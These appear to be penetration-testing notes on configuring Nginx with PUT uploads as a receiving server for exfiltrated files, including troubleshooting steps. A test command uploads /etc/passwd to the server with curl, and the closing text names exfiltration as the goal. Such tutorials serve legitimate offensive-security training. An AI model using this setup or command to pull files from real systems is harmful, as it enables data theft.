## delete


# Catching Files over HTTP/S
## Nginx - Enabling PUT
When allowing HTTP uploads, it is critical to be 100% positive that users cannot upload web shells and execute them. Apache makes it easy to shoot ourselves in the foot with this, as the PHP module loves to execute anything ending in PHP. Configuring Nginx to use PHP is nowhere near as simple.

**Create a Directory to Handle Uploaded Files**
```bash
$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```

**Change the Owner to www-data**
```bash
$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

**Create Nginx Configuration File**
```bash
nano /etc/nginx/sites-available/upload.conf

server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

**Symlink our Site to the sites-enabled Directory**
```bash
$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

**Start Nginx**
```bash
$ sudo systemctl restart nginx.service
```

If we get any error messages, check /var/log/nginx/error.log

**Verifying Errors**
```bash
$ tail -2 /var/log/nginx/error.log

2020/11/17 16:11:56 [emerg] 5679#5679: bind() to 0.0.0.0:`80` failed (98: Address already in use`)
2020/11/17 16:11:56 [emerg] 5679#5679: still could not bind()
```

```bash
$ ss -lnpt | grep 80

LISTEN 0      100          0.0.0.0:80        0.0.0.0:*    users:(("python",pid=`2811`,fd=3),("python",pid=2070,fd=3),("python",pid=1968,fd=3),("python",pid=1856,fd=3))
```

```bash
$ ps -ef | grep 2811

user65      2811    1856  0 16:05 ?        00:00:04 `python -m websockify 80 localhost:5901 -D`
root        6720    2226  0 16:14 pts/0    00:00:00 grep --color=auto 2811
```

**Remove NginxDefault Configuration**
```bash
$ sudo rm /etc/nginx/sites-enabled/default
```

Now we can test uploading by using cURL to send a PUT request. In the below example, we will upload the /etc/passwd file to the server and call it users.txt

**Upload File Using cURL**
```bash
$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

```bash
$ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 

user65:x:1000:1000:,,,:/home/user65:/bin/bash
```

Once we have this working, a good test is to ensure the directory listing is not enabled by navigating to http://localhost/SecretUploadDirectory. By default, with Apache, if we hit a directory without an index file (index.html), it will list all the files. This is bad for our use case of exfilling files because most files are sensitive by nature, and we want to do our best to hide them. Thanks to Nginx being minimal, features like that are not enabled by default.


